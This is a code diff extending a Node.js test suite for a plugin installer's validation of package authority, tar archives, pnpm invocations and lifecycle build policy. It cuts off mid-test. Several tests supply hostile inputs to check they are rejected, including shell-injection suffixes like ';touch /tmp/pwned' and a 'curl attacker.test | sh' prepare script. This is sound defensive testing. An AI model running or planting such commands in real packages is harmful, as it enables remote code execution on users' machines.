@@ -1,6 +1,6 @@
 import assert from 'node:assert/strict';
 import { createHash, randomBytes } from 'node:crypto';
-import { spawnSync } from 'node:child_process';
+import { spawn, spawnSync } from 'node:child_process';
 import {
   chmod,
   link,
@@ -8,14 +8,16 @@ import {
   mkdir,
   mkdtemp,
   open,
+  readdir,
   readFile,
   realpath,
   rename,
   rm,
   writeFile,
 } from 'node:fs/promises';
+import { once } from 'node:events';
 import { tmpdir } from 'node:os';
-import { join } from 'node:path';
+import { delimiter, join, relative } from 'node:path';
 import test from 'node:test';
 import { gzipSync } from 'node:zlib';
 
@@ -24,6 +26,7 @@ import {
   loadSchema,
   lifecycleHooksFromManifest,
   lifecycleHooksSha256,
+  manifestHasRuntimeDependencyGraph,
   resolveItems,
   validateAuthority,
   validateItem,
@@ -37,6 +40,7 @@ import {
   acquireTransactionLock,
   assertPrivateRecoveryPlatform,
   bindRecoverySourceToAuthority,
+  buildBoundPnpmResolutionInvocation,
   buildChildEnvironment,
   buildDshInvocation,
   buildPlan,
@@ -57,12 +61,18 @@ import {
   releaseTransactionLock,
   runAtomicAcceptanceBoundary,
   validateInterruptedRecoveryLock,
+  verifyFrozenLockfileBytes,
   verifyTerminalManagedFilesBinding,
   verifyTerminalSnapshotManagedFilesBinding,
   verifyRuntimeAcceptanceEvidence,
 } from '../skills/dsh-plugin-installer/scripts/install-transaction.mjs';
 import {
   authorizePrepareText,
+  cleanupInstallerOwnedAllowBuilds,
+  cleanupInstallerOwnedAllowBuildsText,
+  revokePrepareText,
+  resolvePnpmLifecyclePolicy,
+  validateProfileResolutionSurface,
   verifyEffectivePnpmBuildPolicy,
 } from '../skills/dsh-plugin-installer/scripts/prepare-authorization.mjs';
 import {
@@ -87,8 +97,14 @@ import {
   createPrivatePnpmBinding,
   pnpmCommandShimShell,
   requiresPnpmCommandShimShell,
-  resolvePnpmExecutable,
+  validatePrivatePnpmPathext,
 } from '../skills/dsh-plugin-installer/scripts/pnpm-binding.mjs';
+import {
+  loadPnpmRuntimeAuthority,
+  pnpmRuntimeClosureSha512,
+  validatePnpmRuntimeArtifact,
+  validatePnpmRuntimeAuthority,
+} from '../skills/dsh-plugin-installer/scripts/pnpm-runtime.mjs';
 import {
   itemAuthoritySha256,
   loadTop10Schema,
@@ -96,10 +112,18 @@ import {
   validateTop10ReleaseSet,
 } from '../skills/dsh-plugin-installer/scripts/top10-authority.mjs';
 import {
+  captureWindowsPrivatePathIdentity,
   secureWindowsPrivatePath,
+  secureWindowsPrivatePaths,
+  trustedWindowsSystemRoot,
+  trustedWindowsSystemRootFromCandidates,
   WINDOWS_CURRENT_USER_PRIVATE_ACL_SCRIPT,
   WINDOWS_PRIVATE_ACL_TIMEOUT_MS,
 } from '../skills/dsh-plugin-installer/scripts/windows-private-acl.mjs';
+import {
+  WINDOWS_POWERSHELL_TEMP_BOOTSTRAP_SCRIPT,
+  windowsPowerShellTempParentFromEnvironment,
+} from '../skills/dsh-plugin-installer/scripts/windows-powershell-temp.mjs';
 
 function sha256(bytes) {
   return createHash('sha256').update(bytes).digest('hex');
@@ -148,6 +172,14 @@ function tar(entries, { compress = true } = {}) {
   return compress ? gzipSync(bytes, { level: 9, mtime: 0 }) : bytes;
 }
 
+function refreshTarHeaderChecksum(bytes, offset = 0) {
+  bytes.fill(0x20, offset + 148, offset + 156);
+  let checksum = 0;
+  for (let index = offset; index < offset + 512; index += 1) checksum += bytes[index];
+  bytes.write(`${checksum.toString(8).padStart(6, '0')}\0 `, offset + 148, 8, 'ascii');
+  return bytes;
+}
+
 function lifecycle(scripts = {}) {
   const hooks = lifecycleHooksFromManifest({ scripts });
   return {
@@ -179,9 +211,13 @@ function hostedFixture({ id = 3006, slug = 'fixture-hosted', name = 'dsh-fixture
   const version = '1.0.0';
   const bundlePatch = 'cordis.patch.yml';
   const license = Buffer.from('MIT License\n');
+  const notice = Buffer.from(
+    `# Modification notice\n\nHosted adaptation of ${name}@${version}.\n\n- License: MIT\n`
+  );
   const manifest = Buffer.from(`${JSON.stringify({
     name,
     version,
+    license: 'MIT',
     dsh: { bundle: { patch: bundlePatch } },
   })}\n`);
   const manifestSha256 = sha256(manifest);
@@ -192,6 +228,7 @@ function hostedFixture({ id = 3006, slug = 'fixture-hosted', name = 'dsh-fixture
     version,
     purl: bomRef,
     'bom-ref': bomRef,
+    licenses: [{ expression: 'MIT' }],
     properties: [{
       name: 'dsh-themes:package-manifest-sha256',
       value: manifestSha256,
@@ -212,6 +249,7 @@ function hostedFixture({ id = 3006, slug = 'fixture-hosted', name = 'dsh-fixture
     },
     { name: `package/${bundlePatch}`, body: '[]\n' },
     { name: 'package/LICENSE', body: license },
+    { name: 'package/NOTICE.md', body: notice },
     { name: 'package/SBOM.cdx.json', body: sbom },
   ]);
   const digest = sha256(bytes);
@@ -232,6 +270,7 @@ function hostedFixture({ id = 3006, slug = 'fixture-hosted', name = 'dsh-fixture
         artifactIntegrity: integrity(digest),
         manifestSha256,
         licenseFile: { path: 'LICENSE', sha256: sha256(license) },
+        noticeFile: { path: 'NOTICE.md', sha256: sha256(notice) },
         sbom: {
           format: 'cyclonedx-json',
           path: 'SBOM.cdx.json',
@@ -351,6 +390,50 @@ function gitFixture() {
   });
 }
 
+function resolvedLifecyclePolicy(items, extraDenied = []) {
+  const directKeys = items.map((item) => ({
+    catalogId: item.catalogId,
+    packageName: item.package.name,
+    policyKey: `${item.package.name}@file:../../prepared/${item.catalogId}.tgz`,
+    snapshotKey: `${item.package.name}@file:../../prepared/${item.catalogId}.tgz`,
+  })).sort((left, right) => left.catalogId - right.catalogId);
+  const authorizedKeys = directKeys
+    .filter((entry) => items.find((item) => item.catalogId === entry.catalogId)
+      .package.lifecycleAuthorization.required)
+    .map((entry) => entry.policyKey)
+    .sort();
+  const deniedKeys = [...new Set([
+    ...extraDenied,
+    ...directKeys
+      .filter((entry) => !authorizedKeys.includes(entry.policyKey))
+      .map((entry) => entry.policyKey),
+  ])].sort();
+  return { schemaVersion: 2, directKeys, authorizedKeys, deniedKeys };
+}
+
+function locklessGitFixture() {
+  const commit = 'a'.repeat(40);
+  const repository = 'https://github.com/example/prebuilt-plugin.git';
+  return upstreamBase({
+    id: 3005,
+    slug: 'fixture-lockless-git-upstream',
+    name: '@example/prebuilt-plugin',
+    version: '1.0.1',
+    scripts: {},
+    source: {
+      type: 'git-commit',
+      repository,
+      commit,
+      tree: 'b'.repeat(40),
+      subdir: '.',
+      installSpec: `git+${repository}#${commit}`,
+      manifestSha256: '3'.repeat(64),
+      lockfilePath: null,
+      lockfileSha256: null,
+    },
+  });
+}
+
 function upstreamArtifactFixture({ type = 'npm-package-version' } = {}) {
   const id = type === 'npm-package-version' ? 3041 : 3033;
   const slug = type === 'npm-package-version' ? 'fixture-npm-upstream' : 'fixture-release-upstream';
@@ -414,6 +497,9 @@ function validationOptions(loaded) {
   return {
     harnessAuthorityBytes: loaded.harnessAuthorityBytes,
     top10ReleaseSetBytes: loaded.top10ReleaseSetBytes,
+    migrationMapBytes: loaded.migrationMapBytes,
+    migrationMapSchemaBytes: loaded.migrationMapSchemaBytes,
+    candidateIntakeBytes: loaded.candidateIntakeBytes,
   };
 }
 
@@ -446,7 +532,7 @@ function promotedContext(loaded, items) {
     const item = items.find((candidate) => candidate.catalogId === catalogId);
     const scores = {
       userValueAndUseCaseClarity: 25,
-      stabilityMaintenanceAndAlpha1Fit: 25,
+      stabilityMaintenanceAndAlpha2Fit: 25,
       securityAndPermissionRestraint: 15,
       crossPlatformInstallRemoveRollback: 15,
       nonTechnicalUsabilityAndDocs: 10,
@@ -502,6 +588,9 @@ function promotedContext(loaded, items) {
     validationOptions: {
       harnessAuthorityBytes: loaded.harnessAuthorityBytes,
       top10ReleaseSetBytes,
+      migrationMapBytes: loaded.migrationMapBytes,
+      migrationMapSchemaBytes: loaded.migrationMapSchemaBytes,
+      candidateIntakeBytes: loaded.candidateIntakeBytes,
     },
   };
 }
@@ -538,7 +627,21 @@ test('current Plugin authority exposes 80 curated records but zero installation 
   const loaded = await loadAuthority();
   assert.equal(
     loaded.authoritySha256,
-    '40d504f2b93adb154e721509e6cd24b9e228e7b5dd901af66934051e77870596'
+    '413e4874d8ee8ac6915bbead4c82d37174b3170e3a90c38c0a507f6cb1382f26'
+  );
+  assert.equal(loaded.authority.migrationReview.retainedCurrentCatalogCount, 52);
+  assert.equal(loaded.authority.migrationReview.retiredCatalogCount, 28);
+  assert.equal(loaded.authority.migrationReview.replacementCandidateCount, 44);
+  assert.equal(loaded.authority.migrationReview.replacementIdsAllocated, false);
+  const changedMigrationBytes = Buffer.from(loaded.migrationMapBytes);
+  changedMigrationBytes[changedMigrationBytes.length - 2] =
+    changedMigrationBytes[changedMigrationBytes.length - 2] === 0x20 ? 0x09 : 0x20;
+  assert.throws(
+    () => validateAuthority(loaded.authority, {
+      ...validationOptions(loaded),
+      migrationMapBytes: changedMigrationBytes,
+    }),
+    /exact alpha\.2 migration review bytes/
   );
   assert.equal(loaded.authority.publication.publishedCatalogPluginCount, 80);
   assert.equal(loaded.authority.publication.requiredVerifiedInstallableCount, 80);
@@ -591,6 +694,9 @@ test('independent Top10 authority freezes scoring but fails closed until 80/80 s
     () => validateAuthority(loaded.authority, {
       harnessAuthorityBytes: loaded.harnessAuthorityBytes,
       top10ReleaseSetBytes: changedBytes,
+      migrationMapBytes: loaded.migrationMapBytes,
+      migrationMapSchemaBytes: loaded.migrationMapSchemaBytes,
+      candidateIntakeBytes: loaded.candidateIntakeBytes,
     }),
     /exact Top10 release-set bytes/
   );
@@ -612,10 +718,15 @@ test('machine schema is closed and models hosted plus fixed upstream distributio
   assert.equal(schema.$defs.item.properties.distribution.oneOf.length, 2);
   assert.equal(schema.$defs.upstreamDistribution.properties.source.oneOf.length, 3);
   assert.equal(schema.$defs.gitCommitSource.properties.subdir.const, '.');
+  assert.equal(schema.$defs.gitCommitSource.oneOf.length, 2);
   assert.equal(schema.$defs.publication.properties.publishedCatalogPluginCount.const, 80);
+  assert.equal(schema.$defs.migrationReview.properties.retainedCurrentCatalogCount.const, 52);
+  assert.equal(schema.$defs.migrationReview.properties.retiredCatalogCount.const, 28);
+  assert.equal(schema.$defs.migrationReview.properties.replacementCandidateCount.const, 44);
+  assert.equal(schema.$defs.migrationReview.properties.replacementIdsAllocated.const, false);
   assert.equal(schema.$defs.hostedDistribution.properties.sbom.additionalProperties, false);
   assert.equal(top10Schema.$defs.weights.properties.userValueAndUseCaseClarity.const, 25);
-  assert.equal(top10Schema.$defs.weights.properties.stabilityMaintenanceAndAlpha1Fit.const, 25);
+  assert.equal(top10Schema.$defs.weights.properties.stabilityMaintenanceAndAlpha2Fit.const, 25);
   assert.equal(top10Schema.$defs.scoring.properties.minimumUseCaseCategories.const, 8);
 });
 
@@ -623,9 +734,10 @@ test('authority validator accepts exact hosted/upstream records and rejects comm
   const loaded = await loadAuthority();
   const hosted = hostedFixture().item;
   const git = gitFixture();
+  const locklessGit = locklessGitFixture();
   const npm = upstreamArtifactFixture().item;
   const release = upstreamArtifactFixture({ type: 'github-release-asset' }).item;
-  const promoted = promotedContext(loaded, fullItemSet([hosted, git, npm, release]));
+  const promoted = promotedContext(loaded, fullItemSet([hosted, git, locklessGit, npm, release]));
   assert.doesNotThrow(() => validateAuthority(promoted.authority, promoted.validationOptions));
   const partial = structuredClone(promoted.authority);
   partial.items = [hosted, git];
@@ -637,6 +749,9 @@ test('authority validator accepts exact hosted/upstream records and rejects comm
     (item) => { item.distribution.source.installSpec += ';touch /tmp/pwned'; },
     (item) => { item.distribution.source.repository = 'https://github.com/example/plugin.git?token=secret'; },
     (item) => { item.package.name = '@example/plugin;echo'; },
+    (item) => { item.package.name = '@-example/plugin'; },
+    (item) => { item.package.name = '@example/-plugin'; },
+    (item) => { item.package.name = '.hidden-plugin'; },
     (item) => { item.package.lifecycle.hooks.prepare += '\necho injected'; },
     (item) => { item.distribution.source.subdir = 'packages/plugin'; },
   ];
@@ -664,24 +779,67 @@ test('authority validator accepts exact hosted/upstream records and rejects comm
   const shortCommit = structuredClone(git);
   shortCommit.distribution.source.commit = 'c'.repeat(12);
   assert.throws(() => validateItem(shortCommit), /Git commit source/);
+  const halfLockless = structuredClone(locklessGit);
+  halfLockless.distribution.source.lockfileSha256 = '2'.repeat(64);
+  assert.throws(() => validateItem(halfLockless), /Git commit source/);
+  const locklessLifecycle = structuredClone(locklessGit);
+  locklessLifecycle.package.lifecycle.hooks.prepare = 'node build.js';
+  locklessLifecycle.package.lifecycle.hooksSha256 = lifecycleHooksSha256(
+    locklessLifecycle.package.lifecycle.hooks
+  );
+  locklessLifecycle.package.lifecycleAuthorization = {
+    required: true,
+    packageKey: locklessLifecycle.package.name,
+    authorizedHooks: ['prepare'],
+    hooksSha256: locklessLifecycle.package.lifecycle.hooksSha256,
+  };
+  assert.throws(() => validateItem(locklessLifecycle), /lockless Git source/);
   const unknownSource = structuredClone(git);
   unknownSource.distribution.source.type = 'git-branch';
   assert.throws(() => validateItem(unknownSource), /source type is unsupported/);
 
-  const invocation = buildDshInvocation('/absolute/dsh-bin.js', [
-    'plugin', '--profile', 'web', 'add', '/private/plugin-deadbeef.tgz', '--save-exact',
-  ]);
+  const pnpmChildEnv = {
+    DSH_PLUGIN_PNPM_NODE: '/absolute/node',
+    DSH_PLUGIN_PNPM_CLI: '/private/pnpm-runtime/package/bin/pnpm.cjs',
+  };
+  const invocation = buildBoundPnpmResolutionInvocation(pnpmChildEnv, [
+    'add', '--save-exact', '--ignore-scripts', '--lockfile-only',
+    '--ignore-pnpmfile', '--', '/private/plugin-deadbeef.tgz',
+  ], { expectedInstallSpec: '/private/plugin-deadbeef.tgz' });
   assert.equal(invocation.shell, false);
-  assert.equal(invocation.args.at(-2), '/private/plugin-deadbeef.tgz');
-  const windowsInvocation = buildDshInvocation('C:\\Program Files\\nodejs\\dsh-bin.js', [
-    'plugin', '--profile', 'web', 'add', 'C:\\Users\\Fixture User\\plugin.tgz', '--save-exact',
-  ]);
-  assert.equal(windowsInvocation.args.at(-2), 'C:\\Users\\Fixture User\\plugin.tgz');
+  assert.equal(invocation.args.at(-1), '/private/plugin-deadbeef.tgz');
+  const unicodeInvocation = buildBoundPnpmResolutionInvocation(pnpmChildEnv, [
+    'add', '--save-exact', '--ignore-scripts', '--lockfile-only',
+    '--ignore-pnpmfile', '--', '/private/插件 #1 (verified).tgz',
+  ], { expectedInstallSpec: '/private/插件 #1 (verified).tgz' });
+  assert.equal(unicodeInvocation.args.at(-1), '/private/插件 #1 (verified).tgz');
+  const windowsInvocation = buildBoundPnpmResolutionInvocation({
+    DSH_PLUGIN_PNPM_NODE: 'C:\\Program Files\\nodejs\\node.exe',
+    DSH_PLUGIN_PNPM_CLI: 'C:\\Private Runtime\\package\\bin\\pnpm.cjs',
+  }, [
+    'add', '--save-exact', '--ignore-scripts', '--lockfile-only',
+    '--ignore-pnpmfile', '--', 'C:\\Users\\Fixture User\\plugin (verified).tgz',
+  ], { expectedInstallSpec: 'C:\\Users\\Fixture User\\plugin (verified).tgz' });
+  assert.equal(windowsInvocation.args.at(-1), 'C:\\Users\\Fixture User\\plugin (verified).tgz');
   assert.throws(
-    () => buildDshInvocation('/absolute/dsh-bin.js', [
-      'plugin', '--profile', 'web', 'add', '/private/plugin.tgz;touch', '--save-exact',
-    ]),
+    () => buildBoundPnpmResolutionInvocation(pnpmChildEnv, [
+      'add', '--save-exact', '--ignore-scripts', '--lockfile-only',
+      '--ignore-pnpmfile', '--', 'C:\\Users\\unsafe%PATH%\\plugin.tgz',
+    ], { expectedInstallSpec: 'C:\\Users\\unsafe%PATH%\\plugin.tgz' }),
+    /command-injection-safe grammar/u
+  );
+  assert.throws(
+    () => buildBoundPnpmResolutionInvocation(pnpmChildEnv, [
+      'add', '--save-exact', '--ignore-scripts', '--lockfile-only',
+      '--ignore-pnpmfile', '--', '/private/../plugin.tgz',
+    ], { expectedInstallSpec: '/private/../plugin.tgz' }),
     /command-injection-safe grammar/
+  );
+  assert.throws(
+    () => buildBoundPnpmResolutionInvocation(pnpmChildEnv, [
+      'add', '/private/plugin.tgz', '--save-exact',
+    ], { expectedInstallSpec: '/private/plugin.tgz' }),
+    /malformed|exact install spec/u
   );
   assert.throws(
     () => buildDshInvocation('/absolute/dsh-bin.js', ['plugin', 'bad\nargument']),
@@ -692,15 +850,32 @@ test('authority validator accepts exact hosted/upstream records and rejects comm
   ]);
   assert.equal(list.shell, false);
   const remove = buildDshInvocation('/absolute/dsh-bin.js', [
-    'plugin', '--profile', 'web', 'remove', '@example/exact-plugin',
+    'plugin', '--profile', 'web', 'remove', '--lockfile-only', '--',
+    '@example/exact-plugin',
   ]);
   assert.equal(remove.shell, false);
-  assert.equal(remove.args.at(-1), '@example/exact-plugin');
+  assert.equal(remove.args[5], '--lockfile-only');
+  assert.equal(remove.args[6], '--');
+  assert.equal(remove.args[7], '@example/exact-plugin');
   assert.throws(
     () => buildDshInvocation('/absolute/dsh-bin.js', [
-      'plugin', '--profile', 'web', 'remove', '@example/exact-plugin;touch',
+      'plugin', '--profile', 'web', 'remove', '--lockfile-only', '--',
+      '@example/exact-plugin;touch',
     ]),
-    /fixed add, remove, list/
+    /fixed materialize, remove, list/u
+  );
+  assert.throws(
+    () => buildDshInvocation('/absolute/dsh-bin.js', [
+      'plugin', '--profile', 'web', 'remove', '--', '@example/exact-plugin',
+    ]),
+    /outside the fixed/u
+  );
+  assert.throws(
+    () => buildBoundPnpmResolutionInvocation(pnpmChildEnv, [
+      'add', '--save-exact', '--ignore-scripts', '--lockfile-only',
+      '--ignore-pnpmfile', '--', '/private/plugin.tgz',
+    ], { expectedInstallSpec: '/private/different.tgz' }),
+    /exact install spec/u
   );
   const dump = buildDshInvocation('/absolute/dsh-bin.js', [
     '--profile', 'web', '--dump-config',
@@ -773,6 +948,7 @@ test('hosted archive binds SBOM/license and rejects lifecycle, traversal, polygl
   const lifecycleManifest = Buffer.from(JSON.stringify({
     name: fixture.item.package.name,
     version: fixture.item.package.version,
+    license: fixture.item.rights.licenseExpression,
     scripts: { prepare: 'curl attacker.test | sh' },
     dsh: { bundle: { patch: fixture.item.package.bundlePatch } },
   }));
@@ -806,50 +982,562 @@ test('hosted archive binds SBOM/license and rejects lifecycle, traversal, polygl
   const raw = tar([{ name: 'package/file', body: 'ok' }], { compress: false });
   const tailed = Buffer.concat([raw, Buffer.alloc(512, 0x41)]);
   assert.throws(() => inspectTarEntries(tailed), /non-zero data after/);
+  const hiddenName = Buffer.from(raw);
+  hiddenName['package/file'.length + 1] = 0x41;
+  refreshTarHeaderChecksum(hiddenName);
+  assert.throws(() => inspectTarEntries(gzipSync(hiddenName)), /hidden bytes/u);
+  const invalidUtf8 = Buffer.from(raw);
+  invalidUtf8[8] = 0xff;
+  refreshTarHeaderChecksum(invalidUtf8);
+  assert.throws(() => inspectTarEntries(gzipSync(invalidUtf8)), /valid UTF-8/u);
+  const badMagic = Buffer.from(raw);
+  badMagic.write('broken\0', 257, 'binary');
+  refreshTarHeaderChecksum(badMagic);
+  assert.throws(() => inspectTarEntries(gzipSync(badMagic)), /POSIX ustar/u);
+  const terminatorOffset = raw.length - 1024;
+  const zeroGap = Buffer.concat([
+    raw.subarray(0, terminatorOffset),
+    Buffer.alloc(512),
+    raw.subarray(0, terminatorOffset),
+    raw.subarray(terminatorOffset),
+  ]);
+  assert.throws(() => inspectTarEntries(gzipSync(zeroGap)), /zero-block gap/u);
 
   const wrongSbom = structuredClone(fixture.item);
   wrongSbom.distribution.sbom.sha256 = '0'.repeat(64);
   assert.throws(() => validateHostedArtifact(fixture.bytes, wrongSbom), /SBOM.*digest/i);
+
+  const wrongNotice = structuredClone(fixture.item);
+  wrongNotice.distribution.noticeFile.sha256 = '0'.repeat(64);
+  assert.throws(
+    () => validateHostedArtifact(fixture.bytes, wrongNotice),
+    /modification notice.*digest/i
+  );
+
+  const wrongLicense = structuredClone(fixture.item);
+  wrongLicense.rights.licenseExpression = 'Apache-2.0';
+  assert.throws(
+    () => validateHostedArtifact(fixture.bytes, wrongLicense),
+    /manifest identity, license/u
+  );
 });
 
-test('prepare authorization adds only exact reviewed package keys and preserves explicit denial', () => {
+test('prepare authorization rejects live builds and persists exact negative closure rules', () => {
   const upstream = gitFixture();
   assert.deepEqual(
     upstream.package.lifecycleAuthorization.authorizedHooks,
     ['prepare', 'install', 'postinstall']
   );
   const base = 'packages:\n  - .\n\nnodeLinker: hoisted\nautoInstallPeers: false\n';
-  const authorized = authorizePrepareText(base, [upstream]);
-  assert.equal(authorized.changed, true);
-  assert.deepEqual(authorized.keys, ['@example/dsh-plugin']);
-  assert.match(authorized.source, /allowBuilds:\n  "@example\/dsh-plugin": true/);
+  const upstreamPolicy = resolvedLifecyclePolicy([upstream], ['transitive-build@4.5.6']);
   assert.throws(
-    () => authorizePrepareText(`${base}\nallowBuilds:\n  "@example/dsh-plugin": false\n`, [upstream]),
-    /explicitly denied/
+    () => authorizePrepareText(base, [upstream], upstreamPolicy),
+    /live lifecycle builds are forbidden/u
+  );
+  const noHook = hostedFixture({
+    id: 3006,
+    slug: 'no-hook-fixture',
+    name: '@example/no-hook-plugin',
+  }).item;
+  const noHookPolicy = resolvedLifecyclePolicy([noHook], ['transitive-build@4.5.6']);
+  const denied = authorizePrepareText(base, [noHook], noHookPolicy);
+  assert.deepEqual(
+    denied.deniedKeys,
+    ['@example/no-hook-plugin@file:../../prepared/3006.tgz', 'transitive-build@4.5.6'].sort()
+  );
+  assert.match(denied.source, /"@example\/no-hook-plugin@file:\.\.\/\.\.\/prepared\/3006\.tgz": false/);
+  assert.match(denied.source, /transitive-build@4\.5\.6: false/);
+  assert.equal(denied.source.match(/#dsh-plugin-installer-owned-v1/gu)?.length, 2);
+  assert.throws(
+    () => authorizePrepareText(
+      `${base}\nallowBuilds:\n  "@example/no-hook-plugin@file:../../prepared/3006.tgz": true\n`,
+      [noHook],
+      noHookPolicy
+    ),
+    /unexpected existing authorization/u
   );
   assert.throws(
-    () => authorizePrepareText(`${base}\nallowBuilds: { "@example/dsh-plugin": false }\n`, [upstream]),
-    /explicitly denied/
-  );
-  assert.throws(
-    () => authorizePrepareText(`${base}\n"allowBuilds":\n  "@example/dsh-plugin": false\n`, [upstream]),
-    /explicitly denied/
-  );
-  assert.throws(
-    () => authorizePrepareText(`${base}\nallowBuilds:\n  "@example/dsh-plugin": true\n"allowBuilds": {}\n`, [upstream]),
+    () => authorizePrepareText(`${base}\nallowBuilds:\n  "@example/no-hook-plugin": true\n"allowBuilds": {}\n`, [noHook], noHookPolicy),
     /invalid|unique|map key/i
   );
   assert.throws(
-    () => authorizePrepareText(`${base}\nshared: &shared\n  x: true\nallowBuilds: *shared\n`, [upstream]),
+    () => authorizePrepareText(`${base}\nshared: &shared\n  x: true\nallowBuilds: *shared\n`, [noHook], noHookPolicy),
     /aliases are forbidden/
   );
   assert.throws(
-    () => authorizePrepareText(`${base}\nallowBuilds:\n  <<: { "@example/dsh-plugin": true }\n`, [upstream]),
+    () => authorizePrepareText(`${base}\nallowBuilds:\n  <<: { "@example/no-hook-plugin": true }\n`, [noHook], noHookPolicy),
     /merge keys are forbidden/
   );
   const injected = structuredClone(upstream);
   injected.package.lifecycleAuthorization.packageKey = '@example/dsh-plugin;touch';
-  assert.throws(() => authorizePrepareText(base, [injected]), /authorization|malformed/);
+  assert.throws(() => authorizePrepareText(base, [injected], upstreamPolicy), /authorization|malformed/);
+  assert.throws(
+    () => revokePrepareText(
+      `${base}\nallowBuilds:\n  "@example/dsh-plugin": true\n  "@example/dsh-plugin@file:../../prepared/3052.tgz": true\n`,
+      [upstream],
+      upstreamPolicy
+    ),
+    /legacy broad lifecycle authorization.*explicit migration/u
+  );
+});
+
+test('installer-owned negative lifecycle rules are cleaned only when the current lock no longer reaches them', () => {
+  const workspaceSource = [
+    'packages:',
+    '  - .',
+    'nodeLinker: hoisted',
+    'autoInstallPeers: false',
+    'dangerouslyAllowAllBuilds: false',
+    'strictDepBuilds: true',
+    'allowBuilds:',
+    '  package-reachable@1.0.0: false #dsh-plugin-installer-owned-v1',
+    '  snapshot-reachable@1.0.0: false #dsh-plugin-installer-owned-v1',
+    '  stale@1.0.0: false #dsh-plugin-installer-owned-v1',
+    '  user-denial@1.0.0: false',
+    '  user-positive@1.0.0: true #dsh-plugin-installer-owned-v1',
+    '  forged-marker@1.0.0: false #dsh-plugin-installer-owned-v1-extra',
+    '',
+  ].join('\n');
+  const lockSource = [
+    "lockfileVersion: '9.0'",
+    'packages:',
+    '  package-reachable@1.0.0:',
+    '    resolution: {}',
+    'snapshots:',
+    '  snapshot-reachable@1.0.0(react@19.0.0): {}',
+    '',
+  ].join('\n');
+  const result = cleanupInstallerOwnedAllowBuildsText(workspaceSource, lockSource);
+  assert.deepEqual(result.removedKeys, ['stale@1.0.0']);
+  assert.match(result.source, /package-reachable@1\.0\.0: false #dsh-plugin-installer-owned-v1/u);
+  assert.match(result.source, /snapshot-reachable@1\.0\.0: false #dsh-plugin-installer-owned-v1/u);
+  assert.match(result.source, /user-denial@1\.0\.0: false/u);
+  assert.match(result.source, /user-positive@1\.0\.0: true #dsh-plugin-installer-owned-v1/u);
+  assert.match(result.source, /forged-marker@1\.0\.0: false #dsh-plugin-installer-owned-v1-extra/u);
+  assert.doesNotMatch(result.source, /stale@1\.0\.0/u);
+  assert.match(result.source, /strictDepBuilds: true/u);
+  assert.match(result.source, /dangerouslyAllowAllBuilds: false/u);
+});
+
+test('installer-owned allowBuilds cleanup atomically persists a bounded strict workspace', async (t) => {
+  const root = await workspace(t);
+  const profile = join(root, 'web');
+  await mkdir(profile);
+  await writeFile(join(profile, 'package.json'), `${JSON.stringify({
+    name: 'dsh-profile-web',
+    private: true,
+    dependencies: {},
+    dsh: {
+      profile: {
+        bundles: ['@deepseek-ai/dsh-base', '@deepseek-ai/dsh-web-app'],
+        patchReload: 'live',
+      },
+    },
+  })}\n`);
+  await writeFile(
+    join(profile, 'pnpm-workspace.yaml'),
+    [
+      'packages:',
+      '  - .',
+      'nodeLinker: hoisted',
+      'autoInstallPeers: false',
+      'dangerouslyAllowAllBuilds: false',
+      'strictDepBuilds: true',
+      'allowBuilds:',
+      '  stale@1.0.0: false #dsh-plugin-installer-owned-v1',
+      '  user-denial@1.0.0: false',
+      '',
+    ].join('\n')
+  );
+  await writeFile(join(profile, 'pnpm-lock.yaml'), "lockfileVersion: '9.0'\n");
+  await writeFile(join(profile, 'cordis.patch.yml'), '[]\n');
+  const result = await cleanupInstallerOwnedAllowBuilds(profile);
+  assert.deepEqual(result.removedKeys, ['stale@1.0.0']);
+  const persisted = await readFile(join(profile, 'pnpm-workspace.yaml'), 'utf8');
+  assert.doesNotMatch(persisted, /stale@1\.0\.0/u);
+  assert.match(persisted, /user-denial@1\.0\.0: false/u);
+  assert.deepEqual(
+    (await readdir(profile)).filter((name) => name.includes('.dsh-plugin-installer-')),
+    []
+  );
+});
+
+test('pnpm lifecycle policy resolves exact source depPaths and denies the new transitive closure', () => {
+  const liveBuild = gitFixture();
+  const item = locklessGitFixture();
+  const directReference = item.distribution.source.installSpec;
+  const gitSpecifier = `github:example/prebuilt-plugin#${item.distribution.source.commit}`;
+  const gitTarball =
+    `https://codeload.github.com/example/prebuilt-plugin/tar.gz/${item.distribution.source.commit}`;
+  const directPackageKey = `${item.package.name}@${gitTarball}`;
+  const directKey = `${directPackageKey}(react@18.3.1)`;
+  const gitIntegrity = `sha512-${Buffer.alloc(64, 7).toString('base64')}`;
+  const sourceContext = {
+    profile: '/private/dsh/profiles/web',
+    artifactIntegrities: [null],
+  };
+  const baseline = [
+    "lockfileVersion: '9.0'",
+    'importers:',
+    '  .: {}',
+    '',
+  ].join('\n');
+  const resolved = [
+    "lockfileVersion: '9.0'",
+    'importers:',
+    '  .:',
+    '    dependencies:',
+    `      ${JSON.stringify(item.package.name)}:`,
+    `        specifier: ${JSON.stringify(gitSpecifier)}`,
+    `        version: ${JSON.stringify(`${gitTarball}(react@18.3.1)`)}`,
+    'packages:',
+    `  ${JSON.stringify(directPackageKey)}:`,
+    '    resolution:',
+    '      gitHosted: true',
+    `      integrity: ${JSON.stringify(gitIntegrity)}`,
+    `      tarball: ${JSON.stringify(gitTarball)}`,
+    `    version: ${JSON.stringify(item.package.version)}`,
+    '  transitive-build@4.5.6:',
+    '    resolution: {}',
+    'snapshots:',
+    `  ${JSON.stringify(directKey)}: {}`,
+    '  transitive-build@4.5.6: {}',
+    '',
+  ].join('\n');
+  const policy = resolvePnpmLifecyclePolicy(
+    baseline,
+    resolved,
+    [item],
+    [directReference],
+    sourceContext
+  );
+  assert.deepEqual(policy.directKeys, [{
+    catalogId: item.catalogId,
+    packageName: item.package.name,
+    policyKey: directPackageKey,
+    snapshotKey: directKey,
+  }]);
+  assert.deepEqual(policy.authorizedKeys, []);
+  assert.deepEqual(policy.deniedKeys, [directPackageKey, 'transitive-build@4.5.6'].sort());
+  assert.throws(
+    () => resolvePnpmLifecyclePolicy(
+      baseline,
+      resolved.replace(`version: ${JSON.stringify(item.package.version)}`, 'version: "9.9.9"'),
+      [item],
+      [directReference],
+      sourceContext
+    ),
+    /version mismatch/u
+  );
+  assert.throws(
+    () => resolvePnpmLifecyclePolicy(
+      baseline,
+      resolved,
+      [liveBuild],
+      [directReference],
+      sourceContext
+    ),
+    /live lifecycle build/u
+  );
+  assert.throws(
+    () => resolvePnpmLifecyclePolicy(
+      baseline,
+      resolved,
+      [item],
+      ['git+https://github.com/wrong/repo.git#' + 'f'.repeat(40)],
+      sourceContext
+    ),
+    /Git source binding/u
+  );
+  assert.throws(
+    () => resolvePnpmLifecyclePolicy(
